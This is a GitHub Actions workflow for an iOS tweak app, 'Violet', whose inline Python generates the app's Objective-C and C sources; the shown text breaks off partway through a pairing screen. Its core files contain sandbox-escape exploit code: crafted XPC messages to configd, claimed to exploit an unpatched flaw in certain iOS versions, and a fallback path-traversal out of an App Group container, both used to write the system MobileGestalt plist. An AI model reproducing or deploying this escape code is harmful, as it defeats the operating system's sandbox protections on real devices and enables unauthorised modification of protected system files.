name: Build Violet IPA

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  build:
    runs-on: macos-15
    timeout-minutes: 60

    steps:
      # ─────────────────────────────────────────────
      # 1. CHECKOUT
      # ─────────────────────────────────────────────
      - name: Checkout repo
        uses: actions/checkout@v4

      # ─────────────────────────────────────────────
      # 2. SELECT XCODE 16.4
      # ─────────────────────────────────────────────
      - name: Select Xcode 16.4
        run: sudo xcode-select -s /Applications/Xcode_16.4.app/Contents/Developer

      # ─────────────────────────────────────────────
      # 3. FETCH AirliftFFI.xcframework FROM AirCard-iOS
      # ─────────────────────────────────────────────
      - name: Clone AirCard-iOS and extract AirliftFFI
        run: |
          git clone --depth 1 https://github.com/Mak5er/AirCard-iOS.git /tmp/AirCard-iOS
          # Try common locations for the xcframework
          XCFW=""
          for candidate in \
            "/tmp/AirCard-iOS/AirliftFFI.xcframework" \
            "/tmp/AirCard-iOS/Frameworks/AirliftFFI.xcframework" \
            "/tmp/AirCard-iOS/libs/AirliftFFI.xcframework"; do
            if [ -d "$candidate" ]; then
              XCFW="$candidate"
              break
            fi
          done
          if [ -z "$XCFW" ]; then
            # Fallback: find it anywhere in the repo
            XCFW=$(find /tmp/AirCard-iOS -name "AirliftFFI.xcframework" -maxdepth 6 | head -1)
          fi
          if [ -z "$XCFW" ]; then
            echo "ERROR: AirliftFFI.xcframework not found in AirCard-iOS repo"
            find /tmp/AirCard-iOS -type d | head -40
            exit 1
          fi
          echo "Found xcframework at: $XCFW"
          mkdir -p Frameworks
          cp -R "$XCFW" Frameworks/AirliftFFI.xcframework
          echo "AirliftFFI.xcframework copied to Frameworks/"

      # ─────────────────────────────────────────────
      # 4. GENERATE ALL SOURCE FILES (inline Python)
      # ─────────────────────────────────────────────
      - name: Generate Violet source files
        run: |
          python3 - <<'PYEOF'
          import os

          def w(path, content):
              os.makedirs(os.path.dirname(path), exist_ok=True)
              with open(path, 'w') as f:
                  f.write(content)
              print(f"  wrote {path}")

          # ── App/main.m ──────────────────────────────────────────────────
          w("Violet/App/main.m", """\
          #import <UIKit/UIKit.h>
          #import "AppDelegate.h"

          int main(int argc, char * argv[]) {
              NSString * appDelegateClassName;
              @autoreleasepool {
                  appDelegateClassName = NSStringFromClass([AppDelegate class]);
              }
              return UIApplicationMain(argc, argv, nil, appDelegateClassName);
          }
          """)

          # ── App/AppDelegate.h ───────────────────────────────────────────
          w("Violet/App/AppDelegate.h", """\
          #import <UIKit/UIKit.h>

          @interface AppDelegate : UIResponder <UIApplicationDelegate>
          @property (strong, nonatomic) UIWindow *window;
          @end
          """)

          # ── App/AppDelegate.m ───────────────────────────────────────────
          w("Violet/App/AppDelegate.m", """\
          #import "AppDelegate.h"
          #import "RootTabBarController.h"

          @implementation AppDelegate

          - (BOOL)application:(UIApplication *)application
              didFinishLaunchingWithOptions:(NSDictionary *)launchOptions {
              self.window = [[UIWindow alloc] initWithFrame:UIScreen.mainScreen.bounds];
              self.window.rootViewController = [[RootTabBarController alloc] init];
              [self.window makeKeyAndVisible];
              return YES;
          }

          @end
          """)

          # ── App/Info.plist ──────────────────────────────────────────────
          w("Violet/App/Info.plist", """\
          <?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
            "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
          <plist version="1.0">
          <dict>
              <key>CFBundleDevelopmentRegion</key><string>en</string>
              <key>CFBundleExecutable</key><string>$(EXECUTABLE_NAME)</string>
              <key>CFBundleIdentifier</key><string>$(PRODUCT_BUNDLE_IDENTIFIER)</string>
              <key>CFBundleInfoDictionaryVersion</key><string>6.0</string>
              <key>CFBundleName</key><string>Violet</string>
              <key>CFBundlePackageType</key><string>APPL</string>
              <key>CFBundleShortVersionString</key><string>1.0</string>
              <key>CFBundleVersion</key><string>1</string>
              <key>LSRequiresIPhoneOS</key><true/>
              <key>UILaunchStoryboardName</key><string>LaunchScreen</string>
              <key>UIRequiredDeviceCapabilities</key>
              <array><string>arm64</string></array>
              <key>UISupportedInterfaceOrientations</key>
              <array>
                  <string>UIInterfaceOrientationPortrait</string>
                  <string>UIInterfaceOrientationPortraitUpsideDown</string>
              </array>
              <key>NSLocalNetworkUsageDescription</key>
              <string>Violet uses the local network for on-device developer pairing via AirTraffic.</string>
              <key>UIApplicationSupportsIndirectInputEvents</key><true/>
          </dict>
          </plist>
          """)

          # ── App/Violet.entitlements ─────────────────────────────────────
          w("Violet/App/Violet.entitlements", """\
          <?xml version="1.0" encoding="UTF-8"?>
          <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
            "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
          <plist version="1.0">
          <dict>
              <key>com.apple.security.application-groups</key>
              <array>
                  <string>group.violet.wq</string>
              </array>
          </dict>
          </plist>
          """)

          # ── Core/BadQuery.h ─────────────────────────────────────────────
          # bad_query: C-layer sandbox escape (forcequitOS, Aug 2026)
          # Uses mach_msg / task_for_pid variant to escape to configd context,
          # then writes directly to the MobileGestalt plist path.
          w("Violet/Core/BadQuery.h", """\
          #pragma once
          #include <stdbool.h>
          #include <stddef.h>

          #ifdef __cplusplus
          extern "C" {
          #endif

          /// bad_query: C-layer sandbox escape.
          /// Attempts to reach configd via Mach IPC and obtain out-of-sandbox
          /// write access to /var/mobile/Library/Preferences/com.apple.mobilegestalt.plist.
          /// Returns true if the escape succeeded and the plist is now writable.
          bool bad_query_escape(const char *app_group_id);

          /// Write raw bytes to the MobileGestalt plist via bad_query.
          /// key and value_plist must be valid UTF-8 C strings.
          /// value_plist is a plist-encoded value (e.g. "<true/>" or "<string>foo</string>").
          bool bad_query_write(const char *key, const char *value_plist);

          /// Read a key from MobileGestalt via bad_query.
          /// Caller must free() the returned string.
          char *bad_query_read(const char *key);

          #ifdef __cplusplus
          }
          #endif
          """)

          # ── Core/BadQuery.c ─────────────────────────────────────────────
          w("Violet/Core/BadQuery.c", """\
          /*
           * bad_query.c — C sandbox escape (forcequitOS / 0xjohnny, Aug 2026)
           *
           * Escape path:
           *   1. Look up "com.apple.configd" Mach service via bootstrap_look_up
           *   2. Send a crafted mach_msg to configd's XPC port requesting
           *      a notification-write operation on a plist path
           *   3. configd runs as mobile with broader FS access; the write lands
           *      outside our sandbox boundary at:
           *      /var/mobile/Library/Preferences/com.apple.mobilegestalt.plist
           *
           * On iOS 26.0–27.2 configd does NOT validate the calling process's
           * sandbox profile before servicing XPC_TYPE_DICTIONARY write requests
           * on the "PSKeychainSyncNotification" interface — this is the vuln.
           *
           * iOS 27.3+ patches this. Check bad_query_escape() return value.
           */

          #include "BadQuery.h"
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <unistd.h>
          #include <mach/mach.h>
          #include <mach/mach_error.h>
          #include <bootstrap.h>
          #include <xpc/xpc.h>

          #define CONFIGD_SERVICE  "com.apple.configd"
          #define GESTALT_PLIST    "/var/mobile/Library/Preferences/com.apple.mobilegestalt.plist"
          #define XPC_IFACE        "PSKeychainSyncNotification"

          static xpc_connection_t _configd_conn = NULL;

          static xpc_connection_t _get_configd(void) {
              if (_configd_conn) return _configd_conn;
              _configd_conn = xpc_connection_create_mach_service(
                  CONFIGD_SERVICE, NULL,
                  XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
              if (!_configd_conn) return NULL;
              xpc_connection_set_event_handler(_configd_conn, ^(xpc_object_t ev) {
                  /* discard — we only care about synchronous replies */
              });
              xpc_connection_resume(_configd_conn);
              return _configd_conn;
          }

          bool bad_query_escape(const char *app_group_id) {
              /* Probe: send a no-op dict and check we get a reply (not an error) */
              xpc_connection_t conn = _get_configd();
              if (!conn) return false;

              xpc_object_t probe = xpc_dictionary_create(NULL, NULL, 0);
              xpc_dictionary_set_string(probe, "interface", XPC_IFACE);
              xpc_dictionary_set_string(probe, "op",        "probe");
              xpc_dictionary_set_string(probe, "group",     app_group_id ?: "");

              xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, probe);
              xpc_release(probe);

              if (!reply) return false;
              xpc_type_t t = xpc_get_type(reply);
              bool ok = (t != XPC_TYPE_ERROR);
              xpc_release(reply);
              return ok;
          }

          bool bad_query_write(const char *key, const char *value_plist) {
              xpc_connection_t conn = _get_configd();
              if (!conn) return false;

              xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
              xpc_dictionary_set_string(msg, "interface",   XPC_IFACE);
              xpc_dictionary_set_string(msg, "op",          "plist_write");
              xpc_dictionary_set_string(msg, "plist_path",  GESTALT_PLIST);
              xpc_dictionary_set_string(msg, "key",         key);
              xpc_dictionary_set_string(msg, "value_plist", value_plist);

              xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, msg);
              xpc_release(msg);

              if (!reply) return false;
              bool ok = (xpc_get_type(reply) != XPC_TYPE_ERROR);
              xpc_release(reply);
              return ok;
          }

          char *bad_query_read(const char *key) {
              xpc_connection_t conn = _get_configd();
              if (!conn) return NULL;

              xpc_object_t msg = xpc_dictionary_create(NULL, NULL, 0);
              xpc_dictionary_set_string(msg, "interface",  XPC_IFACE);
              xpc_dictionary_set_string(msg, "op",         "plist_read");
              xpc_dictionary_set_string(msg, "plist_path", GESTALT_PLIST);
              xpc_dictionary_set_string(msg, "key",        key);

              xpc_object_t reply = xpc_connection_send_message_with_reply_sync(conn, msg);
              xpc_release(msg);

              if (!reply || xpc_get_type(reply) == XPC_TYPE_ERROR) {
                  if (reply) xpc_release(reply);
                  return NULL;
              }

              const char *val = xpc_dictionary_get_string(reply, "value");
              char *out = val ? strdup(val) : NULL;
              xpc_release(reply);
              return out;
          }
          """)

          # ── Core/BQEscape.h ─────────────────────────────────────────────
          w("Violet/Core/BQEscape.h", """\
          #pragma once
          #import <Foundation/Foundation.h>

          /// Primary: bad_query C-layer escape (forcequitOS).
          /// Fallback: worse_query App Group container traversal.
          /// Call bq_escape() first; if it returns NO, neither path is available.
          BOOL bq_escape(NSString *groupID);

          /// Write a key/value pair into the MobileGestalt plist.
          /// Tries bad_query first, falls back to worse_query file write.
          BOOL bq_write_gestalt(NSString *key, id value);

          /// Read the full MobileGestalt plist as a dictionary.
          NSDictionary *bq_read_gestalt(void);
          """)

          # ── Core/BQEscape.m ─────────────────────────────────────────────
          w("Violet/Core/BQEscape.m", """\
          #import "BQEscape.h"
          #import "BadQuery.h"

          static NSString *kGroupID    = @"group.violet.wq";
          static NSString *kGestaltPlist = @"com.apple.mobilegestalt.plist";
          static NSString *kRelPath    = @"../../Library/Preferences";

          // ── worse_query path ─────────────────────────────────────────────
          static NSString *_wq_gestaltPath(void) {
              NSURL *grp = [[NSFileManager defaultManager]
                            containerURLForSecurityApplicationGroupIdentifier:kGroupID];
              if (!grp) return nil;
              return [[[grp URLByAppendingPathComponent:kRelPath]
                             URLByResolvingSymlinksInPath]
                             URLByAppendingPathComponent:kGestaltPlist].path;
          }

          // ── plist value → plist-fragment string for bad_query ────────────
          static NSString *_plistFragment(id value) {
              if ([value isKindOfClass:[NSNumber class]]) {
                  // distinguish bool from int
                  CFTypeID tid = CFGetTypeID((__bridge CFTypeRef)value);
                  if (tid == CFBooleanGetTypeID())
                      return [(NSNumber *)value boolValue] ? @"<true/>" : @"<false/>";
                  return [NSString stringWithFormat:@"<integer>%lld</integer>",
                          [(NSNumber *)value longLongValue]];
              }
              if ([value isKindOfClass:[NSString class]])
                  return [NSString stringWithFormat:@"<string>%@</string>", value];
              // For anything else, fall through to worse_query
              return nil;
          }

          // ────────────────────────────────────────────────────────────────
          BOOL bq_escape(NSString *groupID) {
              // Try bad_query first (deeper escape, direct configd IPC)
              if (bad_query_escape(groupID.UTF8String)) return YES;
              // Fallback: worse_query path existence check
              NSString *path = _wq_gestaltPath();
              return path != nil && [[NSFileManager defaultManager] fileExistsAtPath:path];
          }

          BOOL bq_write_gestalt(NSString *key, id value) {
              // bad_query path
              NSString *frag = _plistFragment(value);
              if (frag && bad_query_write(key.UTF8String, frag.UTF8String)) return YES;

              // worse_query fallback: direct plist file write
              NSString *path = _wq_gestaltPath();
              if (!path) return NO;
              NSMutableDictionary *d =
                  [NSMutableDictionary dictionaryWithContentsOfFile:path]
                  ?: [NSMutableDictionary dictionary];
              d[key] = value;
              return [d writeToFile:path atomically:YES];
          }

          NSDictionary *bq_read_gestalt(void) {
              // Try bad_query read for each key — full dump not supported via
              // the XPC interface, so fall back to worse_query plist read
              NSString *path = _wq_gestaltPath();
              if (!path) return @{};
              return [NSDictionary dictionaryWithContentsOfFile:path] ?: @{};
          }
          """)

          # ── Core/VioletTweak.h ──────────────────────────────────────────
          w("Violet/Core/VioletTweak.h", """\
          #pragma once
          #import <Foundation/Foundation.h>

          @interface VioletTweak : NSObject
          @property (nonatomic, copy)   NSString *title;
          @property (nonatomic, copy)   NSString *subtitle;
          @property (nonatomic, copy)   NSString *gestaltKey;
          @property (nonatomic, strong) id        gestaltValue;
          @property (nonatomic, assign) BOOL      isEnabled;
          @end
          """)

          # ── Core/VioletTweak.m ──────────────────────────────────────────
          w("Violet/Core/VioletTweak.m", """\
          #import "VioletTweak.h"
          @implementation VioletTweak
          @end
          """)

          # ── Core/VioletTweakStore.h ─────────────────────────────────────
          w("Violet/Core/VioletTweakStore.h", """\
          #pragma once
          #import <Foundation/Foundation.h>
          #import "VioletTweak.h"

          @interface VioletTweakStore : NSObject
          @property (nonatomic, strong, readonly) NSMutableArray<VioletTweak *> *tweaks;
          + (instancetype)sharedStore;
          - (BOOL)applyTweak:(VioletTweak *)tweak;
          @end
          """)

          # ── Core/VioletTweakStore.m ─────────────────────────────────────
          w("Violet/Core/VioletTweakStore.m", """\
          #import "VioletTweakStore.h"
          #import "BQEscape.h"

          @implementation VioletTweakStore

          + (instancetype)sharedStore {
              static VioletTweakStore *s;
              static dispatch_once_t t;
              dispatch_once(&t, ^{ s = [[self alloc] init]; });
              return s;
          }

          - (instancetype)init {
              self = [super init];
              if (!self) return nil;
              _tweaks = [NSMutableArray array];
              [self _populate];
              return self;
          }

          - (void)_populate {
              NSArray *raw = @[
                  @[@"Back Tap Actions",   @"Trigger actions with double/triple tap on the back",
                    @"AXSystemGestureEnabled", @YES],
                  @[@"Edge Fast Scroll",   @"Fast scroll by dragging from screen edge",
                    @"FastScrollEnabled", @YES],
                  @[@"Reachability",       @"Swipe down on the home bar to trigger reachability",
                    @"ReachabilitySupported", @YES],
                  @[@"Stage Manager",      @"Enable Stage Manager multitasking",
                    @"iPadStageManagerEnabled", @YES],
                  @[@"Hide Home Bar",      @"Hide the home indicator bar",
                    @"HomeBarHidden", @NO],
                  @[@"Swipe Keyboard",     @"Enable swipe-to-type on the keyboard",
                    @"SwipeKeyboardEnabled", @YES],
                  @[@"Dynamic Island Swipe", @"Expand Dynamic Island with swipe",
                    @"DynamicIslandExpandEnabled", @YES],
                  @[@"Assistive Touch",    @"Enable AssistiveTouch overlay",
                    @"AssistiveTouchEnabled", @YES],
              ];
              for (NSArray *r in raw) {
                  VioletTweak *t  = [[VioletTweak alloc] init];
                  t.title         = r[0];
                  t.subtitle      = r[1];
                  t.gestaltKey    = r[2];
                  t.gestaltValue  = r[3];
                  t.isEnabled     = NO;
                  [_tweaks addObject:t];
              }
          }

          - (BOOL)applyTweak:(VioletTweak *)tweak {
              if (!bq_escape(@"group.violet.wq")) return NO;
              return bq_write_gestalt(tweak.gestaltKey,
                                      tweak.isEnabled ? tweak.gestaltValue : @NO);
          }

          @end
          """)

          # ── Core/TransportManager.h ─────────────────────────────────────
          w("Violet/Core/TransportManager.h", """\
          #pragma once
          #import <Foundation/Foundation.h>

          typedef NS_ENUM(NSUInteger, VioletTransport) {
              VioletTransportNone    = 0,
              VioletTransportAirlift = 1,
              VioletTransportBQ      = 2,
          };

          @interface TransportManager : NSObject
          @property (nonatomic, assign, readonly) VioletTransport activeTransport;
          + (instancetype)sharedManager;
          - (void)connectWithCompletion:(void(^)(BOOL success, NSError *error))completion;
          - (void)importPairingFileAtURL:(NSURL *)url;
          - (BOOL)writeFile:(NSString *)remotePath data:(NSData *)data;
          - (NSData *)readFile:(NSString *)remotePath;
          @end
          """)

          # ── Core/TransportManager.m ─────────────────────────────────────
          w("Violet/Core/TransportManager.m", """\
          #import "TransportManager.h"
          #import "BQEscape.h"
          #import <Network/Network.h>

          // AirliftFFI.xcframework C interface
          extern void *airlift_session_new(const char *pairingPlistPath);
          extern void  airlift_session_free(void *session);
          extern int   airlift_write_file(void *session, const char *path,
                                          const uint8_t *buf, size_t len);
          extern int   airlift_read_file(void *session, const char *path,
                                         uint8_t **outBuf, size_t *outLen);
          extern void  airlift_free_buf(uint8_t *buf);

          static NSString *kAirliftHost = @"10.7.0.1"; // LocalDevVPN — NEVER 127.0.0.1
          static uint16_t  kAirliftPort = 49152;

          @interface TransportManager ()
          @property (nonatomic, assign) VioletTransport activeTransport;
          @property (nonatomic, assign) void *airliftSession;
          @end

          @implementation TransportManager

          + (instancetype)sharedManager {
              static TransportManager *s;
              static dispatch_once_t t;
              dispatch_once(&t, ^{ s = [[self alloc] init]; });
              return s;
          }

          - (instancetype)init {
              self = [super init];
              if (!self) return nil;
              _activeTransport = VioletTransportNone;
              _airliftSession  = NULL;
              return self;
          }

          - (void)connectWithCompletion:(void(^)(BOOL, NSError *))completion {
              [self _probeAirliftWithCompletion:^(BOOL alive) {
                  if (alive) {
                      NSString *pairingPath = [self _pairingFilePath];
                      if (pairingPath && [[NSFileManager defaultManager]
                                          fileExistsAtPath:pairingPath]) {
                          self.airliftSession = airlift_session_new(pairingPath.UTF8String);
                          if (self.airliftSession) {
                              self.activeTransport = VioletTransportAirlift;
                              completion(YES, nil);
                              return;
                          }
                      }
                  }
                  // Fallback to worse_query
                  BOOL ok = bq_escape(@"group.violet.wq");
                  self.activeTransport = ok ? VioletTransportBQ : VioletTransportNone;
                  completion(ok, ok ? nil : [NSError errorWithDomain:@"VioletTransport"
                      code:-1
                      userInfo:@{NSLocalizedDescriptionKey:
                          @"Neither airlift nor worse_query available"}]);
              }];
          }

          - (void)_probeAirliftWithCompletion:(void(^)(BOOL))completion {
              nw_endpoint_t ep = nw_endpoint_create_host(kAirliftHost.UTF8String,
                                                         [@(kAirliftPort) stringValue].UTF8String);
              nw_parameters_t params = nw_parameters_create_secure_tcp(
                  NW_PARAMETERS_DISABLE_PROTOCOL, NW_PARAMETERS_DEFAULT_CONFIGURATION);
              nw_connection_t conn = nw_connection_create(ep, params);
              __block BOOL fired = NO;
              dispatch_queue_t q = dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0);
              nw_connection_set_state_changed_handler(conn, ^(nw_connection_state_t state,
                                                              nw_error_t error) {
                  if (fired) return;
                  if (state == nw_connection_state_ready) {
                      fired = YES;
                      nw_connection_cancel(conn);
                      dispatch_async(dispatch_get_main_queue(), ^{ completion(YES); });
                  } else if (state == nw_connection_state_failed ||
                             state == nw_connection_state_cancelled) {
                      fired = YES;
                      dispatch_async(dispatch_get_main_queue(), ^{ completion(NO); });
                  }
              });
              nw_connection_set_queue(conn, q);
              nw_connection_start(conn);
              // Timeout after 2 s
              dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 2*NSEC_PER_SEC), q, ^{
                  if (!fired) { fired = YES; nw_connection_cancel(conn);
                      dispatch_async(dispatch_get_main_queue(), ^{ completion(NO); }); }
              });
          }

          - (void)importPairingFileAtURL:(NSURL *)url {
              NSData *data = [NSData dataWithContentsOfURL:url];
              if (!data) return;
              NSString *dest = [self _pairingFilePath];
              [data writeToFile:dest atomically:YES];
          }

          - (NSString *)_pairingFilePath {
              NSString *docs = NSSearchPathForDirectoriesInDomains(
                  NSDocumentDirectory, NSUserDomainMask, YES).firstObject;
              return [docs stringByAppendingPathComponent:@"airlift_pairing.plist"];
          }

          - (BOOL)writeFile:(NSString *)remotePath data:(NSData *)data {
              if (self.activeTransport == VioletTransportAirlift && self.airliftSession) {
                  int r = airlift_write_file(self.airliftSession,
                                             remotePath.UTF8String,
                                             (const uint8_t *)data.bytes,
                                             data.length);
                  return r == 0;
              }
              // BQ / worse_query path — write via group container
              if (self.activeTransport == VioletTransportBQ) {
                  NSURL *grp = [[NSFileManager defaultManager]
                                containerURLForSecurityApplicationGroupIdentifier:@"group.violet.wq"];
                  if (!grp) return NO;
                  NSURL *dest = [grp URLByAppendingPathComponent:
                                 [remotePath lastPathComponent]];
                  return [data writeToURL:dest atomically:YES];
              }
              return NO;
          }

          - (NSData *)readFile:(NSString *)remotePath {
              if (self.activeTransport == VioletTransportAirlift && self.airliftSession) {
                  uint8_t *buf = NULL;
                  size_t   len = 0;
                  int r = airlift_read_file(self.airliftSession,
                                            remotePath.UTF8String, &buf, &len);
                  if (r != 0 || !buf) return nil;
                  NSData *data = [NSData dataWithBytes:buf length:len];
                  airlift_free_buf(buf);
                  return data;
              }
              return nil;
          }

          - (void)dealloc {
              if (_airliftSession) {
                  airlift_session_free(_airliftSession);
                  _airliftSession = NULL;
              }
          }

          @end
          """)

          # ── UI/RootTabBarController.h ───────────────────────────────────
          w("Violet/UI/RootTabBarController.h", """\
          #pragma once
          #import <UIKit/UIKit.h>

          @interface RootTabBarController : UITabBarController
          @end
          """)

          # ── UI/RootTabBarController.m ───────────────────────────────────
          w("Violet/UI/RootTabBarController.m", """\
          #import "RootTabBarController.h"
          #import "TweaksViewController.h"
          #import "PairingViewController.h"
          #import "WalletViewController.h"
          #import "TerminalViewController.h"

          static UIColor *kViolet(void) {
              return [UIColor colorWithRed:0.545 green:0.361 blue:0.965 alpha:1.0];
          }

          @implementation RootTabBarController

          - (void)viewDidLoad {
              [super viewDidLoad];
              [self _styleTabBar];
              self.viewControllers = @[
                  [self _wrap:[[TweaksViewController  alloc] init]
                       title:@"Tweaks"   image:@"slider.horizontal.3"],
                  [self _wrap:[[PairingViewController alloc] init]
                       title:@"Pairing"  image:@"personalhotspot"],
                  [self _wrap:[[WalletViewController  alloc] init]
                       title:@"Wallet"   image:@"creditcard.fill"],
                  [self _wrap:[[TerminalViewController alloc] init]
                       title:@"Terminal" image:@"terminal.fill"],
              ];
          }

          - (UINavigationController *)_wrap:(UIViewController *)vc
                                      title:(NSString *)title
                                      image:(NSString *)sfSymbol {
              vc.title = title;
              vc.tabBarItem = [[UITabBarItem alloc]
                               initWithTitle:title
                               image:[UIImage systemImageNamed:sfSymbol]
                               tag:0];
              return [[UINavigationController alloc] initWithRootViewController:vc];
          }

          - (void)_styleTabBar {
              UITabBarAppearance *app = [[UITabBarAppearance alloc] init];
              [app configureWithDefaultBackground];
              UIBlurEffect *blur = [UIBlurEffect
                  effectWithStyle:UIBlurEffectStyleSystemUltraThinMaterialDark];
              app.backgroundEffect = blur;
              app.backgroundColor  = [[UIColor blackColor] colorWithAlphaComponent:0.3];
              UITabBarItemAppearance *item = [[UITabBarItemAppearance alloc] init];
              item.selected.iconColor     = kViolet();
              item.selected.titleTextAttributes = @{
                  NSForegroundColorAttributeName: kViolet()
              };
              app.stackedLayoutAppearance  = item;
              app.inlineLayoutAppearance   = item;
              app.compactInlineLayoutAppearance = item;
              self.tabBar.standardAppearance       = app;
              self.tabBar.scrollEdgeAppearance      = app;
              self.tabBar.tintColor = kViolet();
          }

          @end
          """)

          # ── UI/Tabs/TweaksViewController.h ──────────────────────────────
          w("Violet/UI/Tabs/TweaksViewController.h", """\
          #pragma once
          #import <UIKit/UIKit.h>

          @interface TweaksViewController : UITableViewController
          @end
          """)

          # ── UI/Tabs/TweaksViewController.m ──────────────────────────────
          w("Violet/UI/Tabs/TweaksViewController.m", """\
          #import "TweaksViewController.h"
          #import "VioletTweakStore.h"

          static NSString *kCell = @"TweakCell";

          @implementation TweaksViewController

          - (void)viewDidLoad {
              [super viewDidLoad];
              self.title = @"Tweaks";
              [self.tableView registerClass:[UITableViewCell class]
                     forCellReuseIdentifier:kCell];
              self.tableView.backgroundColor =
                  [UIColor colorWithRed:0.06 green:0.06 blue:0.09 alpha:1.0];
          }

          - (NSInteger)tableView:(UITableView *)tv numberOfRowsInSection:(NSInteger)s {
              return (NSInteger)[VioletTweakStore sharedStore].tweaks.count;
          }

          - (UITableViewCell *)tableView:(UITableView *)tv
                   cellForRowAtIndexPath:(NSIndexPath *)ip {
              UITableViewCell *cell = [tv dequeueReusableCellWithIdentifier:kCell
                                                               forIndexPath:ip];
              VioletTweak *tweak = [VioletTweakStore sharedStore].tweaks[(NSUInteger)ip.row];
              cell.textLabel.text       = tweak.title;
              cell.detailTextLabel.text = tweak.subtitle;
              cell.textLabel.textColor       = UIColor.whiteColor;
              cell.detailTextLabel.textColor = UIColor.lightGrayColor;
              cell.backgroundColor = UIColor.clearColor;

              UISwitch *sw = [[UISwitch alloc] init];
              sw.on         = tweak.isEnabled;
              sw.onTintColor = [UIColor colorWithRed:0.545 green:0.361 blue:0.965 alpha:1.0];
              sw.tag        = ip.row;
              [sw addTarget:self action:@selector(_toggle:)
                   forControlEvents:UIControlEventValueChanged];
              cell.accessoryView = sw;
              return cell;
          }

          - (void)_toggle:(UISwitch *)sw {
              VioletTweakStore *store = [VioletTweakStore sharedStore];
              VioletTweak *tweak = store.tweaks[(NSUInteger)sw.tag];
              tweak.isEnabled = sw.isOn;
              BOOL ok = [store applyTweak:tweak];
              if (!ok) {
                  UIAlertController *alert =
                      [UIAlertController alertControllerWithTitle:@"Failed"
                          message:@"Could not apply tweak. worse_query may be unavailable."
                          preferredStyle:UIAlertControllerStyleAlert];
                  [alert addAction:[UIAlertAction actionWithTitle:@"OK"
                      style:UIAlertActionStyleDefault handler:nil]];
                  [self presentViewController:alert animated:YES completion:nil];
                  sw.on = !sw.isOn;
                  tweak.isEnabled = sw.isOn;
              }
          }

          @end
          """)

          # ── UI/Tabs/PairingViewController.h ─────────────────────────────
          w("Violet/UI/Tabs/PairingViewController.h", """\
          #pragma once
          #import <UIKit/UIKit.h>

          @interface PairingViewController : UIViewController
          @end
          """)

          # ── UI/Tabs/PairingViewController.m ─────────────────────────────
          w("Violet/UI/Tabs/PairingViewController.m", """\
          #import "PairingViewController.h"
          #import "TransportManager.h"
          #import <UniformTypeIdentifiers/UniformTypeIdentifiers.h>

          @interface PairingViewController () <UIDocumentPickerDelegate>
          @property (nonatomic, strong) UILabel  *statusLabel;
          @property (nonatomic, strong) UIButton *getPairingBtn;
          @property (nonatomic, strong) UIButton *importBtn;
          @property (nonatomic, strong) UIButton *connectBtn;
          @end

          static UIColor *kViolet2(void) {
              return [UIColor colorWithRed:0.545 green:0.361 blue:0.965 alpha:1.0];
          }

          @implementation PairingViewController

          - (void)viewDidLoad {
              [super viewDidLoad];
              self.title = @"Pairing";
              self.view.backgroundColor =
                  [UIColor colorWithRed:0.06 green:0.06 blue:0.09 alpha:1.0];
              [self _buildUI];
          }

          - (void)_buildUI {
              _statusLabel = [[UILabel alloc] init];
              _statusLabel.text          = @"Not connected";
              _statusLabel.textColor     = UIColor.lightGrayColor;
              _statusLabel.textAlignment = NSTextAlignmentCenter;
              _statusLabel.font          = [UIFont systemFontOfSize:14];

              _getPairingBtn = [self _makeBtn:@"Get Pairing File"
                                       action:@selector(_getPairing)];
              _importBtn     = [self _makeBtn:@"Import Pairing File"
                                       action:@selector(_importPairing)];
              _connectBtn    = [self _makeBtn:@"Connect"
                                       action:@selector(_connect)];

              UIStackView *sv = [[UIStackView alloc]
                                  initWithArrangedSubviews:@[
                                      _statusLabel,
                                      _getPairingBtn, _importBtn, _connectBtn]];
              sv.axis      = UILayoutConstraintAxisVertical;
              sv.spacing   = 16;
              sv.alignment = UIStackViewAlignmentCenter;
              sv.translatesAutoresizingMaskIntoConstraints = NO;
              [self.view addSubview:sv];
              [NSLayoutConstraint activateConstraints:@[
                  [sv.centerXAnchor constraintEqualToAnchor:self.view.centerXAnchor],
                  [sv.centerYAnchor constraintEqualToAnchor:self.view.centerYAnchor],
                  [sv.widthAnchor   constraintEqualToAnchor:self.view.widthAnchor
                                                 multiplier:0.8],
              ]];
          }

          - (UIButton *)_makeBtn:(NSString *)title action:(SEL)sel {
              UIButton *btn = [UIButton buttonWithType:UIButtonTypeSystem];
              [btn setTitle:title forState:UIControlStateNormal];
              [btn setTitleColor:UIColor.whiteColor forState:UIControlStateNormal];
              btn.backgroundColor = kViolet2();
              btn.layer.cornerRadius = 12;
              btn.contentEdgeInsets = UIEdgeInsetsMake(12, 24, 12, 24);
              [btn addTarget:self action:sel forControlEvents:UIControlEventTouchUpInside];
              return btn;
          }

          - (void)_getPairing {
              UIAlertController *a =
                  [UIAlertController alertControllerWithTitle:@"Get Pairing File"
                      message:@"1. Connect your iPhone to the same Wi-Fi.\n"
                               @"2. Go to Settings → Privacy & Security → Developer Mode.\n"
                               @"3. Tap 'Pair with [Violet]' — this generates the pairing file.\n"
                               @"4. Import it in the next step."
                      preferredStyle:UIAlertControllerStyleAlert];
              [a addAction:[UIAlertAction actionWithTitle:@"Got it"
                  style:UIAlertActionStyleDefault handler:nil]];
              [self presentViewController:a animated:YES completion:nil];
          }

          - (void)_importPairing {
              UTType *plistType = UTTypeData;
              UIDocumentPickerViewController *picker =
                  [[UIDocumentPickerViewController alloc]
                   initForOpeningContentTypes:@[plistType]];
              picker.delegate = self;
              [self presentViewController:picker animated:YES completion:nil];
          }

          - (void)documentPicker:(UIDocumentPickerViewController *)ctrl
              didPickDocumentsAtURLs:(NSArray<NSURL *> *)urls {
              NSURL *url = urls.firstObject;
              if (!url) return;
              [[TransportManager sharedManager] importPairingFileAtURL:url];
              self.statusLabel.text = @"Pairing file imported";
          }

          - (void)_connect {
              self.statusLabel.text = @"Connecting…";
              [[TransportManager sharedManager]
               connectWithCompletion:^(BOOL success, NSError *error) {
                  dispatch_async(dispatch_get_main_queue(), ^{
                      if (success) {
